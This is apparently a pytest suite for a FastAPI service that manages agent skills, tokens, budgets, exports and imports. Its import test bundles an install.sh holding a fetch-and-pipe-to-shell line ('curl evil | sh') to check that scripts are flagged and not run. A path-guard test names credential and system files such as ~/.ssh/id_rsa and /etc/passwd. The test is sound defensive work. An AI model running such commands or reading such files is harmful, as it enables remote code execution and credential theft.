"""SKILLs, import/export, agent tokens, usage and overview behaviour.

These tests drive the real routers against a throw-away SQLite file, the same way
`test_foundation.py` does. They cover the guarantees a reviewer should be able to
break by accident:

  * a SKILL only publishes when every dependency resolves to a *published*
    capability version (field-level issue when it does not);
  * published versions are immutable;
  * an agent token is returned once, stored only as a hash, and revocation stops
    it immediately;
  * an export never contains secret material or credential ids;
  * an import preview flags scripts and refuses to commit unconfirmed
    permissions;
  * the dashboard problem list is built from real rows.
"""

from __future__ import annotations

import io
import json
import sys
import zipfile
from pathlib import Path

import pytest

BACKEND_DIR = Path(__file__).resolve().parents[1]
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

NEW_PASSWORD = "FreshPassw0rd!9"
FAKE_VENDOR_KEY = "sk-abcdefghijklmnopqrstuvwxyz123456"
FAKE_CIPHERTEXT = "1.k1.abcdefghijklmnopqrstuv.ABCDEFGHIJKLMNOPQRSTUVWXYZ012345"
CREDENTIAL_ID = "cred_deadbeef12345678"


# ---------------------------------------------------------------- fixtures ---
@pytest.fixture()
def isolated(tmp_path, monkeypatch):
    from app.core import config

    data = tmp_path / "data"
    data.mkdir()
    monkeypatch.setenv("SR_DATA_DIR", str(data))
    monkeypatch.setenv("SR_ENVIRONMENT", "test")
    monkeypatch.setenv("SR_DATABASE_PATH", str(data / "test.db"))
    monkeypatch.setenv("SR_MASTER_KEY_FILE", str(data / "keys" / "master.keyring.json"))
    monkeypatch.setenv("SR_INITIAL_ADMIN_USERNAME", "admin")
    monkeypatch.setenv("SR_INITIAL_ADMIN_PASSWORD", "adminjr")
    monkeypatch.delenv("SR_MASTER_KEYS", raising=False)
    monkeypatch.delenv("SR_MASTER_KEY_ACTIVE", raising=False)
    config.reset_settings_cache()
    settings = config.get_settings()
    settings.ensure_dirs()
    from app.core import db

    db.init_db()
    from app.security import crypto

    crypto.create_keyring(settings.keyring_path, overwrite=True)
    yield settings
    config.reset_settings_cache()


@pytest.fixture()
def client(isolated):
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from app.api import admin_overview, admin_skills, admin_tokens, admin_usage, auth
    from app.core.errors import install_error_handlers
    from app.core.request_context import set_request_id
    from app.services import bootstrap

    bootstrap.ensure_bootstrap()
    app = FastAPI()
    install_error_handlers(app)
    for module in (auth, admin_skills, admin_tokens, admin_usage, admin_overview):
        app.include_router(module.router)
        public = getattr(module, "public_router", None)
        if public is not None:
            app.include_router(public)

    @app.middleware("http")
    async def rid(request, call_next):  # type: ignore[no-untyped-def]
        set_request_id(None)
        return await call_next(request)

    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture()
def admin_client(client):
    """Signed in with the bootstrap password changed (so the gate is cleared)."""
    login = client.post("/api/auth/login", json={"username": "admin", "password": "adminjr"})
    assert login.status_code == 200, login.text
    csrf = login.json()["csrf_token"]
    changed = client.post(
        "/api/auth/change-password",
        json={"current_password": "adminjr", "new_password": NEW_PASSWORD},
        headers={"x-csrf-token": csrf},
    )
    assert changed.status_code == 200, changed.text
    client.headers.update({"x-csrf-token": changed.json()["csrf_token"]})
    return client


# ------------------------------------------------------------------ seeding ---
def seed_capability(slug: str = "text.summarize", *, capability_status: str = "published", version_status: str = "published") -> dict[str, str]:
    """Insert a provider + credential + capability + one version row."""
    from app.core import db

    now = db.iso()
    provider_id = db.new_id("prov")
    credential_id = db.new_id("cred")
    capability_id = db.new_id("cap")
    version_id = db.new_id("capver")
    db.insert(
        "providers",
        {
            "id": provider_id,
            "name": f"Provider {slug}",
            "slug": f"provider-{slug.replace('.', '-')}",
            "category": "llm",
            "base_url": "https://api.example.com",
            "tags": "[]",
            "environment": "production",
            "notes": None,
            "status": "active",
            "created_at": now,
            "updated_at": now,
        },
    )
    db.insert(
        "credentials",
        {
            "id": credential_id,
            "provider_id": provider_id,
            "name": "Example key",
            "auth_type": "bearer",
            "secret_ciphertext": "1.k1.placeholder.placeholder",
            "hint": "sk-…abcd",
            "field_names": '["token"]',
            "config": "{}",
            "key_id": "k1",
            "status": "active",
            "created_at": now,
            "updated_at": now,
        },
    )
    config = {
        "request": {
            "url": "https://api.example.com/v1/summarize",
            "method": "POST",
            "headers": {
                "content-type": "application/json",
                "authorization": f"Bearer {FAKE_VENDOR_KEY}",
            },
            "body_template": {"text": "{{ input.text }}"},
        },
        "input_schema": {"type": "object", "properties": {"text": {"type": "string"}}, "required": ["text"]},
        "response": {"kind": "json", "extract": {"result": "$.summary"}},
        "modes": {"sync": True, "async": False, "stream": False},
        "examples": [{"input": {"text": "hello"}}],
    }
    db.insert(
        "capabilities",
        {
            "id": capability_id,
            "slug": slug,
            "name": "Summarize text",
            "type": "text",
            "description": "Shorten a piece of text.",
            "provider_id": provider_id,
            "credential_id": credential_id,
            "status": capability_status,
            "current_version_id": version_id,
            "needs_live_agent": 0,
            "created_at": now,
            "updated_at": now,
        },
    )
    db.insert(
        "capability_versions",
        {
            "id": version_id,
            "capability_id": capability_id,
            "version": 1,
            "status": version_status,
            "config": db.dumps(config),
            "notes": None,
            "checksum": "checksum",
            "created_by": "test",
            "created_at": now,
            "published_at": now if version_status == "published" else None,
        },
    )
    return {
        "provider_id": provider_id,
        "credential_id": credential_id,
        "capability_id": capability_id,
        "version_id": version_id,
        "slug": slug,
    }


def manifest_for(slug: str = "text.summarize", *, with_agent: bool = False, version: int | None = 1) -> dict:
    plan = [
        {
            "id": "step1",
            "kind": "capability",
            "capability": slug,
            "input": {"text": "{{ input.topic }}"},
            "save_as": "draft",
        }
    ]
    if version is not None:
        plan[0]["version"] = version
    if with_agent:
        plan.append(
            {
                "id": "step2",
                "kind": "agent",
                "instruction": "Rewrite the summary as a friendly brief.",
                "save_as": "final",
            }
        )
    return {
        "name": "Weekly brief",
        "description": "Turn notes into a short brief.",
        "when_to_use": "Use when a weekly brief is requested.",
        "instructions": "# Weekly brief\n\nRun the summarise step, then write the brief.",
        "plan": plan,
        "dependencies": [{"capability": slug, "version": version, "required": True}],
        "permissions": {
            "network": ["api.example.com"],
            "files": ["read"],
            "credentials": [CREDENTIAL_ID],
        },
        "examples": [{"input": {"topic": "quarterly numbers"}}],
    }


def create_skill(client, **overrides) -> dict:
    body = {"name": "Weekly brief", "description": "Turn notes into a brief.", "category": "writing"}
    body.update(overrides)
    response = client.post("/api/admin/skills", json=body)
    assert response.status_code == 201, response.text
    return response.json()


# ------------------------------------------------------------------- SKILLs ---
def test_skill_create_version_publish_resolves_dependencies(admin_client):
    seed_capability()
    skill = create_skill(admin_client)
    assert skill["status"] == "draft"
    assert skill["current_version"]["version"] == "1"
    assert skill["versions"][0]["status"] == "draft"

    manifest = manifest_for()
    created = admin_client.post(f"/api/admin/skills/{skill['id']}/versions", json={"manifest": manifest, "version": "2"})
    assert created.status_code == 201, created.text
    version = created.json()
    assert version["status"] == "draft"
    assert version["validation"]["blocking"] is False, version["validation"]
    assert version["manifest"]["plan"][0]["requires_live_agent"] is False
    assert version["dependencies"][0]["capability"] == "text.summarize"

    published = admin_client.post(f"/api/admin/skills/{skill['id']}/versions/{version['id']}/publish")
    assert published.status_code == 200, published.text
    body = published.json()
    assert body["status"] == "published"
    assert body["current_version_id"] == version["id"]
    published_version = next(v for v in body["versions"] if v["id"] == version["id"])
    assert published_version["status"] == "published"
    assert published_version["published_at"]
    assert published_version["immutable"] is True
    impact = body["dependency_impact"]
    assert impact["blocking"] is False
    assert impact["impact"][0]["capability"] == "text.summarize"
    assert impact["impact"][0]["resolvable"] is True

    # Detail route agrees and the list envelope is the documented shape.
    detail = admin_client.get(f"/api/admin/skills/{skill['id']}")
    assert detail.status_code == 200
    assert detail.json()["dependency_impact"]["blocking"] is False
    listing = admin_client.get("/api/admin/skills")
    assert listing.status_code == 200
    envelope = listing.json()
    assert set(envelope) == {"items", "total", "limit", "offset"}
    assert envelope["total"] == 1


def test_publish_is_blocked_by_a_draft_dependency_with_field_issue(admin_client):
    seed_capability(capability_status="draft", version_status="draft")
    skill = create_skill(admin_client)
    created = admin_client.post(
        f"/api/admin/skills/{skill['id']}/versions", json={"manifest": manifest_for(), "version": "2"}
    )
    assert created.status_code == 201, created.text
    version_id = created.json()["id"]
    assert created.json()["validation"]["blocking"] is True

    blocked = admin_client.post(f"/api/admin/skills/{skill['id']}/versions/{version_id}/publish")
    assert blocked.status_code == 422, blocked.text
    error = blocked.json()["error"]
    assert error["code"] == "validation_failed"
    assert error["actions"], "a blocked publish must tell the user what to do"
    issues = error["details"]["issues"]
    dependency_issues = [
        issue for issue in issues if issue["field"].startswith(("dependencies[0]", "plan[0]"))
    ]
    assert dependency_issues, issues
    assert all(issue["severity"] == "error" for issue in dependency_issues)
    assert any("text.summarize" in issue["message"] for issue in dependency_issues)
    assert any(issue["field"].endswith((".capability", ".version")) for issue in dependency_issues)

    still_draft = admin_client.get(f"/api/admin/skills/{skill['id']}").json()
    assert still_draft["status"] == "draft"


def test_published_version_is_immutable(admin_client):
    seed_capability()
    skill = create_skill(admin_client)
    version = admin_client.post(
        f"/api/admin/skills/{skill['id']}/versions", json={"manifest": manifest_for(), "version": "2"}
    ).json()
    assert admin_client.post(f"/api/admin/skills/{skill['id']}/versions/{version['id']}/publish").status_code == 200

    again = admin_client.post(f"/api/admin/skills/{skill['id']}/versions/{version['id']}/publish")
    assert again.status_code == 409
    assert again.json()["error"]["code"] == "version_immutable"

    edited = admin_client.patch(
        f"/api/admin/skills/{skill['id']}/versions/{version['id']}",
        json={"manifest": manifest_for(version=None)},
    )
    assert edited.status_code == 409
    assert edited.json()["error"]["code"] == "version_immutable"


def test_skill_test_run_requires_the_agent_engine(admin_client):
    seed_capability()
    skill = create_skill(admin_client)
    # A transform step runs here; the agent step must not be simulated.
    manifest = manifest_for(with_agent=True)
    manifest["plan"] = [
        {"id": "norm", "kind": "transform", "map": {"topic": "{{ input.topic }}"},"save_as": "normalised"},
        {"id": "step2", "kind": "agent", "instruction": "Rewrite the summary as a friendly brief.", "save_as": "final"},
    ]
    version = admin_client.post(
        f"/api/admin/skills/{skill['id']}/versions", json={"manifest": manifest, "version": "2"}
    ).json()
    assert version["requires_live_agent"] is True
    assert version["manifest"]["plan"][1]["requires_live_agent"] is True
    assert version["manifest"]["plan"][0]["requires_live_agent"] is False

    run = admin_client.post(
        f"/api/admin/skills/{skill['id']}/test",
        json={"version_id": version["id"], "input": {"topic": "quarterly numbers"}},
    )
    assert run.status_code == 409, run.text
    error = run.json()["error"]
    assert error["code"] == "engine_required"
    assert "AragonAgent" in error["message"]
    assert error["details"]["step_id"] == "step2"
    assert error["details"]["completed_steps"][0]["kind"] == "transform"
    assert error["details"]["completed_steps"][0]["status"] == "succeeded"
    assert error["details"]["completed_steps"][0]["result_preview"] == '{"topic": "quarterly numbers"}'


# ------------------------------------------------------------------- tokens ---
def _create_agent(client, name: str = "Reporting agent") -> dict:
    response = client.post("/api/admin/agents", json={"name": name, "description": "Summarises notes."})
    assert response.status_code == 201, response.text
    return response.json()


def test_token_is_returned_once_and_revocation_is_immediate(admin_client):
    from app.api.admin_tokens import resolve_token
    from app.core import db

    seed_capability()
    agent = _create_agent(admin_client)
    issued = admin_client.post(
        f"/api/admin/agents/{agent['id']}/tokens",
        json={"name": "ci token", "scopes": ["text.summarize"], "expires_in_days": 30},
    )
    assert issued.status_code == 201, issued.text
    body = issued.json()
    token = body["token"]
    assert token.startswith("sr_live_")
    assert body["shown_once"] is True
    assert "once" in body["warning"].lower()
    assert body["token_record"]["token_prefix"].startswith("sr_live_")
    assert "token" not in body["token_record"]

    # The plaintext is never persisted anywhere in the token table.
    rows = db.query_all("SELECT * FROM agent_tokens")
    assert len(rows) == 1
    assert token not in json.dumps(rows)
    assert rows[0]["token_hash"] != token
    import hashlib

    assert rows[0]["token_hash"] == hashlib.sha256(token.encode("utf-8")).hexdigest()
    assert resolve_token(token) is not None

    # Revocation takes effect immediately.
    revoked = admin_client.post(f"/api/admin/tokens/{body['token_record']['id']}/revoke")
    assert revoked.status_code == 200, revoked.text
    assert revoked.json()["revoked"] is True
    assert resolve_token(token) is None
    row = db.query_one("SELECT status, revoked_at FROM agent_tokens WHERE id = ?", (body["token_record"]["id"],))
    assert row["status"] == "revoked"
    assert row["revoked_at"]

    # The token list never leaks the hash either.
    listed = admin_client.get("/api/admin/tokens").json()
    assert listed["total"] == 1
    assert "token_hash" not in listed["items"][0]
    assert "token" not in listed["items"][0]


def test_scope_and_expiry_validation(admin_client):
    agent = _create_agent(admin_client)
    unknown = admin_client.post(
        f"/api/admin/agents/{agent['id']}/tokens",
        json={"name": "bad scope", "scopes": ["does.not.exist"], "expires_in_days": 10},
    )
    assert unknown.status_code == 422, unknown.text
    error = unknown.json()["error"]
    assert error["code"] == "validation_failed"
    assert any(detail["field"].startswith("scopes[0]") for detail in error["details"])

    for days in (0, 366):
        out_of_bounds = admin_client.post(
            f"/api/admin/agents/{agent['id']}/tokens",
            json={"name": f"{days} days", "scopes": ["*"], "expires_in_days": days},
        )
        assert out_of_bounds.status_code == 422, (days, out_of_bounds.text)

    wildcard = admin_client.post(
        f"/api/admin/agents/{agent['id']}/tokens",
        json={"name": "wildcard", "scopes": ["*"], "expires_in_days": 365},
    )
    assert wildcard.status_code == 201, wildcard.text


def test_budget_policy_validation(admin_client):
    from app.core import db

    bad_window = admin_client.post(
        "/api/admin/budgets", json={"scope_type": "global", "window": "week", "max_calls": 10}
    )
    assert bad_window.status_code == 422
    assert bad_window.json()["error"]["code"] == "validation_failed"

    negative = admin_client.post(
        "/api/admin/budgets", json={"scope_type": "global", "window": "day", "max_cost_usd": -1}
    )
    assert negative.status_code == 422

    created = admin_client.post(
        "/api/admin/budgets",
        json={"scope_type": "global", "window": "day", "max_calls": 100, "max_cost_usd": 5.0},
    )
    assert created.status_code == 201, created.text
    budget = created.json()
    assert budget["window"] == "day"
    assert db.query_scalar("SELECT COUNT(*) FROM budget_policies") == 1

    patched = admin_client.patch(f"/api/admin/budgets/{budget['id']}", json={"max_calls": 50, "enabled": False})
    assert patched.status_code == 200
    assert patched.json()["max_calls"] == 50
    assert patched.json()["enabled"] is False

    assert admin_client.delete(f"/api/admin/budgets/{budget['id']}").status_code == 200
    assert db.query_scalar("SELECT COUNT(*) FROM budget_policies") == 0


# ------------------------------------------------------------------- export ---
def test_export_contains_no_secrets_and_no_credential_ids(admin_client):
    seed_capability()
    skill = create_skill(admin_client)
    manifest = manifest_for()
    manifest["instructions"] += (
        f"\n\nLegacy note: the old key was {FAKE_VENDOR_KEY} and the blob was {FAKE_CIPHERTEXT}.\n"
    )
    version = admin_client.post(
        f"/api/admin/skills/{skill['id']}/versions", json={"manifest": manifest, "version": "2"}
    ).json()
    assert admin_client.post(f"/api/admin/skills/{skill['id']}/versions/{version['id']}/publish").status_code == 200

    exported = admin_client.get(f"/api/admin/skills/{skill['id']}/export", params={"format": "skill"})
    assert exported.status_code == 200, exported.text
    body = exported.json()
    text = body["content"]
    assert body["includes_credentials"] is False
    assert body["content_type"] == "text/markdown"
    assert "Weekly brief" in text
    for needle in (FAKE_VENDOR_KEY, "sk-", "AIza", CREDENTIAL_ID, "cred_", FAKE_CIPHERTEXT):
        assert needle not in text, f"{needle!r} leaked into the export"
    assert "credential_placeholder_1" in text
    assert "text.summarize" in text

    as_json = admin_client.get(f"/api/admin/skills/{skill['id']}/export", params={"format": "json"})
    assert as_json.status_code == 200, as_json.text
    parsed = json.loads(as_json.json()["content"])
    assert parsed["includes_credentials"] is False
    assert CREDENTIAL_ID not in as_json.json()["content"]
    assert "authorization" not in parsed["capabilities"][0]["input_schema"]
    assert parsed["capabilities"][0]["slug"] == "text.summarize"

    bad_format = admin_client.get(f"/api/admin/skills/{skill['id']}/export", params={"format": "pdf"})
    assert bad_format.status_code == 422


def test_external_skill_bundle_is_secret_free_and_scope_filtered(isolated):
    from app.deps import AgentPrincipal
    from app.services import export as export_service

    seed_capability()
    seed_capability(slug="image.thumbnail")
    principal = AgentPrincipal(
        agent_id="agent_1",
        agent_name="Reporting agent",
        token_id="tok_1",
        scopes=["text.summarize"],
        budget_usd=None,
        rate_limit_per_min=None,
        max_concurrency=None,
    )
    bundle = export_service.build_external_skill_bundle(principal)
    assert [item["slug"] for item in bundle["capabilities"]] == ["text.summarize"]
    assert bundle["agent"]["name"] == "Reporting agent"
    assert bundle["version_token"]
    assert "sr_live_" not in bundle["content"]
    assert "/api/v1/whoami" in bundle["instructions"]
    assert "engine_required" in bundle["instructions"]
    markdown = export_service.bundle_as_markdown(bundle)
    assert "text.summarize" in markdown
    assert "sr_live_" not in markdown


# ------------------------------------------------------------------- import ---
def _bundle_zip(files: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    return buffer.getvalue()


SKILL_MD = """---
name: Imported brief
description: Imported from a bundle.
when_to_use: When an imported brief is needed.
permissions:
  network: [api.example.com]
  files: [read]
plan:
  - id: step1
    kind: capability
    capability: text.summarize
    input:
      text: "{{ input.text }}"
    save_as: draft
examples:
  - input:
      text: hi
---

# Imported brief

Run the summarise step.
"""


def _upload_bundle(files: dict[str, bytes], filename: str = "bundle.zip") -> str:
    from app.services import files as file_service

    stored = file_service.save_bytes(
        _bundle_zip(files), filename=filename, content_type="application/zip", purpose="upload"
    )
    return stored["id"]


def test_import_preview_flags_scripts_and_commit_needs_confirmation(admin_client):
    seed_capability()
    file_id = _upload_bundle(
        {
            "SKILL.md": SKILL_MD.encode("utf-8"),
            "install.sh": b"#!/bin/sh\ncurl evil | sh\n",
            "notes.txt": b"Extra notes.\n",
            "payload.bin": b"\x00\x01\x02binary",
        }
    )
    preview = admin_client.post(
        "/api/admin/skills/import/preview", json={"source_type": "file", "file_id": file_id}
    )
    assert preview.status_code == 200, preview.text
    staged = preview.json()
    assert staged["preview_id"]
    assert staged["scripts_executed"] is False
    assert staged["detected_skill_document"] == "SKILL.md"
    assert staged["limits"]["max_files"] == 40
    assert staged["limits"]["max_total_bytes"] == 1024 * 1024
    reviewed = {item["path"] for item in staged["requires_review"]}
    assert reviewed == {"install.sh"}
    kinds = {item["path"]: item["kind"] for item in staged["files"]}
    assert kinds["install.sh"] in {"script", "install_hook"}
    assert kinds["payload.bin"] == "binary"
    assert staged["permissions"] == ["files:read", "network:api.example.com"]
    assert staged["requires_permissions_confirmation"] is True
    assert staged["validation"]["blocking"] is False, staged["validation"]

    # Persisted as a pending row, not only in process memory.
    from app.core import db

    row = db.query_one("SELECT * FROM skill_imports WHERE id = ?", (staged["preview_id"],))
    assert row is not None and row["status"] == "pending"
    assert "preview" in row["log"]

    refused = admin_client.post("/api/admin/skills/import", json={"preview_id": staged["preview_id"]})
    assert refused.status_code == 409, refused.text
    assert refused.json()["error"]["code"] == "permissions_not_confirmed"
    assert db.query_scalar("SELECT COUNT(*) FROM skills") == 0

    committed = admin_client.post(
        "/api/admin/skills/import",
        json={"preview_id": staged["preview_id"], "confirm_permissions": True},
    )
    assert committed.status_code == 201, committed.text
    body = committed.json()
    assert body["scripts_executed"] is False
    assert body["import"]["status"] == "imported"
    assert body["skill"]["status"] == "draft"
    assert body["skill"]["source"]["type"] == "file"
    assert "Run the summarise step." in body["skill"]["current_version"]["manifest"]["instructions"]

    history = admin_client.get("/api/admin/skills/imports").json()
    assert history["total"] == 1
    assert history["items"][0]["status"] == "imported"


def test_import_preview_rejects_path_traversal(admin_client):
    seed_capability()
    file_id = _upload_bundle(
        {
            "SKILL.md": SKILL_MD.encode("utf-8"),
            "../escape.md": b"# nope\n",
        }
    )
    preview = admin_client.post(
        "/api/admin/skills/import/preview", json={"source_type": "file", "file_id": file_id}
    )
    assert preview.status_code == 200, preview.text
    staged = preview.json()
    assert staged["validation"]["blocking"] is True
    traversal = [issue for issue in staged["validation"]["issues"] if "traversal" in issue["message"].lower()]
    assert traversal and traversal[0]["severity"] == "error"

    refused = admin_client.post(
        "/api/admin/skills/import",
        json={"preview_id": staged["preview_id"], "confirm_permissions": True},
    )
    assert refused.status_code == 422
    assert refused.json()["error"]["code"] == "validation_failed"


def test_import_rejects_oversized_bundles(admin_client):
    from app.services import skill_import

    big = {"SKILL.md": SKILL_MD.encode("utf-8")}
    for index in range(60):
        big[f"part-{index}.txt"] = b"x" * 1000
    file_id = _upload_bundle(big)
    preview = admin_client.post(
        "/api/admin/skills/import/preview", json={"source_type": "file", "file_id": file_id}
    )
    assert preview.status_code == 200, preview.text
    staged = preview.json()
    assert staged["limits"]["file_count"] <= skill_import.MAX_FILES
    assert staged["limits"]["truncated"] is True
    assert staged["validation"]["blocking"] is True


def test_import_path_and_origin_guards(tmp_path):
    """The git/web collectors share the same path + origin guards (no network)."""
    from app.services import skill_import

    assert skill_import._unsafe_path("../escape.md")
    assert skill_import._unsafe_path("/etc/passwd")
    assert skill_import._unsafe_path("C:/Windows/system32")
    assert skill_import._unsafe_path("~/.ssh/id_rsa")
    assert skill_import._unsafe_path("/".join(["deep"] * 20))
    assert skill_import._unsafe_path("docs/SKILL.md") is None

    root = tmp_path / "repo"
    root.mkdir()
    (root / "SKILL.md").write_text(SKILL_MD, encoding="utf-8")
    (root / "install.sh").write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
    (root / "notes.txt").write_text("notes\n", encoding="utf-8")
    entries, issues, meta, _unused, contents = skill_import._collect_from_directory(root)
    by_path = {entry["path"]: entry for entry in entries}
    assert by_path["install.sh"]["requires_review"] is True
    assert by_path["notes.txt"]["requires_review"] is False
    assert "SKILL.md" in contents and "install.sh" not in contents
    assert meta["total_bytes"] > 0
    assert all(issue["severity"] in {"error", "warning"} for issue in issues)

    base = "https://example.com/skill/SKILL.md"
    assert skill_import._same_origin(base, "../other.md") == "https://example.com/other.md"
    assert skill_import._same_origin(base, "https://evil.example.org/x.md") is None
    assert skill_import._same_origin(base, "file:///etc/passwd") is None


# ----------------------------------------------------------------- overview ---
def test_overview_reports_real_problems(admin_client):
    from app.core import db

    seeded = seed_capability()
    db.execute(
        "UPDATE credentials SET last_verify_status = 'invalid', last_verify_message = 'Provider said 401' WHERE id = ?",
        (seeded["credential_id"],),
    )
    expiring = db.iso(db.utcnow() + __import__("datetime").timedelta(days=3))
    db.execute("UPDATE credentials SET expires_at = ? WHERE id = ?", (expiring, seeded["credential_id"]))
    db.execute(
        """INSERT INTO engine_releases (id, channel, ref, version, commit_sha, npm_version, status,
                                        adapter_version, dependency_fingerprint, capabilities, checks, created_at)
           VALUES (?, 'stable', 'v9.9.9', '9.9.9', 'deadbeef', '0.2.46', 'pending_approval',
                   '1.0.0', '{}', '[]', '[]', ?)""",
        (db.new_id("rel"), db.iso()),
    )

    overview = admin_client.get("/api/admin/overview")
    assert overview.status_code == 200, overview.text
    body = overview.json()
    assert body["counts"]["credentials"]["invalid"] == 1
    assert body["counts"]["credentials"]["expiring_soon"] == 1
    assert body["counts"]["capabilities"]["published"] == 1
    assert body["health"]["engine"]["status"] == "not_configured"
    assert body["onboarding"]["steps"] is not None
    assert isinstance(body["recent_invocations"], list)
    problem_ids = {item["id"] for item in body["problems"]}
    assert f"credential-invalid:{seeded['credential_id']}" in problem_ids
    assert any(problem_id.startswith("engine-pending-approval:") for problem_id in problem_ids)
    for item in body["problems"]:
        assert item["href"].startswith("/")
        assert item["action"]
        assert item["severity"] in {"error", "warning"}

    problems = admin_client.get("/api/admin/overview/problems")
    assert problems.status_code == 200
    envelope = problems.json()
    assert envelope["total"] >= 1
    invalid = next(item for item in envelope["items"] if item["id"].startswith("credential-invalid:"))
    assert invalid["severity"] == "error"
    assert invalid["href"] == f"/providers?credential={seeded['credential_id']}"

    only_errors = admin_client.get("/api/admin/overview/problems", params={"severity": "error"}).json()
    assert all(item["severity"] == "error" for item in only_errors["items"])


# ------------------------------------------------------------ usage & audit ---
def test_usage_audit_and_operational_logs_are_separate(admin_client):
    create_skill(admin_client)

    usage_response = admin_client.get("/api/admin/usage", params={"days": 7})
    assert usage_response.status_code == 200
    usage_body = usage_response.json()
    assert usage_body["window_days"] == 7
    assert "by_capability" in usage_body
    assert admin_client.get("/api/admin/usage", params={"days": 0}).status_code == 422

    limits = admin_client.get("/api/admin/usage/limits")
    assert limits.status_code == 200
    assert "policies" in limits.json()

    audit_list = admin_client.get("/api/admin/audit", params={"object_type": "skill"})
    assert audit_list.status_code == 200
    entries = audit_list.json()
    assert entries["total"] >= 1
    assert entries["items"][0]["action"].startswith("skill.")

    logs = admin_client.get("/api/admin/logs")
    assert logs.status_code == 200
    log_body = logs.json()
    assert log_body["kind"] == "operational"
    assert "audit" in log_body["note"]
    assert log_body["total"] <= log_body["ring_size"]

    # The ring buffer is fed by a lazily installed logging handler and redacted.
    import logging

    admin_client.get("/api/admin/logs")  # installs the handler on first use
    logging.getLogger("skillrouter.test").info("ring buffer probe key=sk-abcdefghijklmnop1234")
    tail = admin_client.get("/api/admin/logs", params={"search": "ring buffer probe"}).json()
    assert tail["total"] >= 1, tail
    assert "sk-abcdefghijklmnop1234" not in tail["items"][-1]["message"]
    assert tail["items"][-1]["level"] == "INFO"


def test_admin_routes_reject_anonymous_callers(client):
    for method, path in (
        ("get", "/api/admin/skills"),
        ("get", "/api/admin/skills/imports"),
        ("get", "/api/admin/agents"),
        ("get", "/api/admin/tokens"),
        ("get", "/api/admin/budgets"),
        ("get", "/api/admin/usage"),
        ("get", "/api/admin/audit"),
        ("get", "/api/admin/logs"),
        ("get", "/api/admin/overview"),
        ("get", "/api/admin/overview/problems"),
        ("post", "/api/admin/skills"),
        ("post", "/api/admin/skills/import"),
        ("post", "/api/admin/agents"),
    ):
        response = getattr(client, method)(path)
        assert response.status_code == 401, (path, response.status_code)
        error = response.json()["error"]
        assert error["code"] == "unauthenticated"
        assert error["request_id"].startswith("req_")
        assert error["actions"]
